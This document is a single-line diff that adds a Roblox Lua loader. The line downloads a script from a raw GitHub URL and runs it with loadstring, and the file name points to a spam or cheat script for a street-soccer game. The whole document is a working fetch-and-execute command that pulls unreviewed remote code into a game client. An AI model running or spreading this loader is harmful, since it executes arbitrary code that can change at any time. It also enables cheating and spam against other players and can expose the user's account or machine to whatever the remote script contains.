@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/street-soccer-pro-spam3-0uczizebmd4z6m.lua"))()
